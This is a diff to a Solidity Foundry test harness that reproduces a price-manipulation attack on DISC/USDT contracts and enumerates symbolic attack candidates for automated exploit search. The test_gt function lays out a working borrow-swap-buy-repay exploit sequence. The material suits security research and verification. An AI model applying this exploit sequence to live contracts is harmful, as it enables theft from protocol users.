@@ -88,8 +88,6 @@ contract DiscoverTest is Test, BlockLoader {
         usdt.transfer(address(ethpledge), balanceOfusdtethpledge);
         disc.transfer(address(ethpledge), balanceOfdiscethpledge);
         usdt.transfer(address(attackContract), balanceOfusdtattacker);
-        usdt.approve(attacker, UINT256_MAX);
-        disc.approve(attacker, UINT256_MAX);
     }
 
     function printBalance(string memory tips) public {
@@ -166,20 +164,48 @@ contract DiscoverTest is Test, BlockLoader {
         return;
     }
 
-    function borrow_usdt(uint256 amount) internal {
-        usdt.transferFrom(owner, attacker, amount);
+    function borrow_owner_usdt(uint256 amount) internal {
+        vm.stopPrank();
+        vm.prank(owner);
+        usdt.transfer(attacker, amount);
+        vm.startPrank(attacker);
     }
 
-    function payback_usdt(uint256 amount) internal {
+    function payback_owner_usdt(uint256 amount) internal {
         usdt.transfer(owner, amount);
     }
 
-    function borrow_disc(uint256 amount) internal {
-        disc.transferFrom(owner, attacker, amount);
+    function borrow_owner_disc(uint256 amount) internal {
+        vm.stopPrank();
+        vm.prank(owner);
+        disc.transfer(attacker, amount);
+        vm.startPrank(attacker);
     }
 
-    function payback_disc(uint256 amount) internal {
+    function payback_owner_disc(uint256 amount) internal {
         disc.transfer(owner, amount);
+    }
+
+    function borrow_pair_usdt(uint256 amount) internal {
+        vm.stopPrank();
+        vm.prank(address(pair));
+        usdt.transfer(attacker, amount);
+        vm.startPrank(attacker);
+    }
+
+    function payback_pair_usdt(uint256 amount) internal {
+        usdt.transfer(address(pair), amount);
+    }
+
+    function borrow_pair_disc(uint256 amount) internal {
+        vm.stopPrank();
+        vm.prank(address(pair));
+        disc.transfer(attacker, amount);
+        vm.startPrank(attacker);
+    }
+
+    function payback_pair_disc(uint256 amount) internal {
+        disc.transfer(address(pair), amount);
     }
 
     function swap_pair_usdt_disc(uint256 amount) internal {
@@ -221,13 +247,13 @@ contract DiscoverTest is Test, BlockLoader {
 
     function test_gt() public {
         vm.startPrank(attacker);
-        borrow_disc(24000e18);
+        borrow_owner_disc(24000e18);
         printBalance("After step0 ");
         swap_pair_disc_usdt(disc.balanceOf(attacker));
         printBalance("After step1 ");
         swap_ethpledge_usdt_disc(5000e18);
         printBalance("After step2 ");
-        payback_disc((24000e18 * 1003) / 1000);
+        payback_owner_disc((24000e18 * 1003) / 1000);
         printBalance("After step3 ");
         require(attackGoal(), "Attack failed!");
         vm.stopPrank();
@@ -241,15 +267,111 @@ contract DiscoverTest is Test, BlockLoader {
     ) public {
         vm.startPrank(attacker);
         vm.assume(amt3 == (amt0 * 1003) / 1000);
-        borrow_disc(amt0);
+        borrow_owner_disc(amt0);
         swap_pair_disc_usdt(amt1);
         swap_ethpledge_usdt_disc(amt2);
-        payback_disc(amt3);
+        payback_owner_disc(amt3);
         assert(!attackGoal());
         vm.stopPrank();
     }
 
-    function check_cand000(
+    function check_cand000(uint256 amt0, uint256 amt1) public {
+        vm.startPrank(attacker);
+        vm.assume(amt1 == (amt0 * 1003) / 1000);
+        borrow_owner_usdt(amt0);
+        payback_owner_usdt(amt1);
+        assert(!attackGoal());
+        vm.stopPrank();
+    }
+
+    function check_cand001(uint256 amt0, uint256 amt1) public {
+        vm.startPrank(attacker);
+        vm.assume(amt1 == (amt0 * 1003) / 1000);
+        borrow_owner_disc(amt0);
+        payback_owner_disc(amt1);
+        assert(!attackGoal());
+        vm.stopPrank();
+    }
+
+    function check_cand002(uint256 amt0, uint256 amt1) public {
+        vm.startPrank(attacker);
+        vm.assume(amt1 == (amt0 * 1003) / 1000);
+        borrow_pair_usdt(amt0);
+        payback_pair_usdt(amt1);
+        assert(!attackGoal());
+        vm.stopPrank();
+    }
+
+    function check_cand003(uint256 amt0, uint256 amt1) public {
+        vm.startPrank(attacker);
+        vm.assume(amt1 == (amt0 * 1003) / 1000);
+        borrow_pair_disc(amt0);
+        payback_pair_disc(amt1);
+        assert(!attackGoal());
+        vm.stopPrank();
+    }
+
+    function check_cand004(uint256 amt0, uint256 amt1) public {
+        vm.startPrank(attacker);
+        vm.assume(amt1 == (amt0 * 1003) / 1000);
+        borrow_owner_usdt(amt0);
+        sync_pair();
+        payback_owner_usdt(amt1);
+        assert(!attackGoal());
+        vm.stopPrank();
+    }
+
+    function check_cand005(uint256 amt0, uint256 amt1, uint256 amt2) public {
+        vm.startPrank(attacker);
+        vm.assume(amt2 == (amt0 * 1003) / 1000);
+        borrow_owner_disc(amt0);
+        swap_pair_disc_usdt(amt1);
+        payback_owner_disc(amt2);
+        assert(!attackGoal());
+        vm.stopPrank();
+    }
+
+    function check_cand006(uint256 amt0, uint256 amt1) public {
+        vm.startPrank(attacker);
+        vm.assume(amt1 == (amt0 * 1003) / 1000);
+        borrow_owner_disc(amt0);
+        sync_pair();
+        payback_owner_disc(amt1);
+        assert(!attackGoal());
+        vm.stopPrank();
+    }
+
+    function check_cand007(uint256 amt0, uint256 amt1) public {
+        vm.startPrank(attacker);
+        vm.assume(amt1 == (amt0 * 1003) / 1000);
+        borrow_pair_usdt(amt0);
+        sync_pair();
+        payback_pair_usdt(amt1);
+        assert(!attackGoal());
+        vm.stopPrank();
+    }
+
+    function check_cand008(uint256 amt0, uint256 amt1, uint256 amt2) public {
+        vm.startPrank(attacker);
+        vm.assume(amt2 == (amt0 * 1003) / 1000);
+        borrow_pair_disc(amt0);
+        swap_pair_disc_usdt(amt1);
+        payback_pair_disc(amt2);
+        assert(!attackGoal());
+        vm.stopPrank();
+    }
+
+    function check_cand009(uint256 amt0, uint256 amt1) public {
+        vm.startPrank(attacker);
+        vm.assume(amt1 == (amt0 * 1003) / 1000);
+        borrow_pair_disc(amt0);
+        sync_pair();
+        payback_pair_disc(amt1);
+        assert(!attackGoal());
+        vm.stopPrank();
+    }
+
+    function check_cand010(
         uint256 amt0,
         uint256 amt1,
         uint256 amt2,
@@ -257,15 +379,15 @@ contract DiscoverTest is Test, BlockLoader {
     ) public {
         vm.startPrank(attacker);
         vm.assume(amt3 == (amt0 * 1003) / 1000);
-        borrow_usdt(amt0);
+        borrow_owner_usdt(amt0);
         swap_pair_usdt_disc(amt1);
         swap_pair_disc_usdt(amt2);
-        payback_usdt(amt3);
+        payback_owner_usdt(amt3);
         assert(!attackGoal());
         vm.stopPrank();
     }
 
-    function check_cand001(
+    function check_cand011(
         uint256 amt0,
         uint256 amt1,
         uint256 amt2,
@@ -273,15 +395,15 @@ contract DiscoverTest is Test, BlockLoader {
     ) public {
         vm.startPrank(attacker);
         vm.assume(amt3 == (amt0 * 1003) / 1000);
-        borrow_usdt(amt0);
+        borrow_owner_usdt(amt0);
         swap_ethpledge_usdt_disc(amt1);
         swap_pair_disc_usdt(amt2);
-        payback_usdt(amt3);
+        payback_owner_usdt(amt3);
         assert(!attackGoal());
         vm.stopPrank();
     }
 
-    function check_cand002(
+    function check_cand012(
         uint256 amt0,
         uint256 amt1,
         uint256 amt2,
@@ -289,15 +411,15 @@ contract DiscoverTest is Test, BlockLoader {
     ) public {
         vm.startPrank(attacker);
         vm.assume(amt3 == (amt0 * 1003) / 1000);
-        borrow_disc(amt0);
+        borrow_owner_disc(amt0);
         swap_pair_disc_usdt(amt1);
         swap_pair_usdt_disc(amt2);
-        payback_disc(amt3);
+        payback_owner_disc(amt3);
         assert(!attackGoal());
         vm.stopPrank();
     }
 
-    function check_cand003(
+    function check_cand013(
         uint256 amt0,
         uint256 amt1,
         uint256 amt2,
@@ -305,82 +427,10 @@ contract DiscoverTest is Test, BlockLoader {
     ) public {
         vm.startPrank(attacker);
         vm.assume(amt3 == (amt0 * 1003) / 1000);
-        borrow_disc(amt0);
+        borrow_owner_disc(amt0);
         swap_pair_disc_usdt(amt1);
         swap_ethpledge_usdt_disc(amt2);
-        payback_disc(amt3);
-        assert(!attackGoal());
-        vm.stopPrank();
-    }
-
-    function check_cand004(
-        uint256 amt0,
-        uint256 amt1,
-        uint256 amt2,
-        uint256 amt3,
-        uint256 amt4
-    ) public {
-        vm.startPrank(attacker);
-        vm.assume(amt4 == (amt0 * 1003) / 1000);
-        borrow_usdt(amt0);
-        swap_pair_usdt_disc(amt1);
-        swap_pair_disc_usdt(amt2);
-        swap_pair_disc_usdt(amt3);
-        payback_usdt(amt4);
-        assert(!attackGoal());
-        vm.stopPrank();
-    }
-
-    function check_cand005(
-        uint256 amt0,
-        uint256 amt1,
-        uint256 amt2,
-        uint256 amt3,
-        uint256 amt4
-    ) public {
-        vm.startPrank(attacker);
-        vm.assume(amt4 == (amt0 * 1003) / 1000);
-        borrow_usdt(amt0);
-        swap_ethpledge_usdt_disc(amt1);
-        swap_pair_disc_usdt(amt2);
-        swap_pair_disc_usdt(amt3);
-        payback_usdt(amt4);
-        assert(!attackGoal());
-        vm.stopPrank();
-    }
-
-    function check_cand006(
-        uint256 amt0,
-        uint256 amt1,
-        uint256 amt2,
-        uint256 amt3,
-        uint256 amt4
-    ) public {
-        vm.startPrank(attacker);
-        vm.assume(amt4 == (amt0 * 1003) / 1000);
-        borrow_disc(amt0);
-        swap_pair_disc_usdt(amt1);
-        swap_pair_usdt_disc(amt2);
-        swap_pair_disc_usdt(amt3);
-        payback_disc(amt4);
-        assert(!attackGoal());
-        vm.stopPrank();
-    }
-
-    function check_cand007(
-        uint256 amt0,
-        uint256 amt1,
-        uint256 amt2,
-        uint256 amt3,
-        uint256 amt4
-    ) public {
-        vm.startPrank(attacker);
-        vm.assume(amt4 == (amt0 * 1003) / 1000);
-        borrow_disc(amt0);
-        swap_pair_disc_usdt(amt1);
-        swap_ethpledge_usdt_disc(amt2);
-        swap_pair_disc_usdt(amt3);
-        payback_disc(amt4);
+        payback_owner_disc(amt3);
         assert(!attackGoal());
         vm.stopPrank();
     }
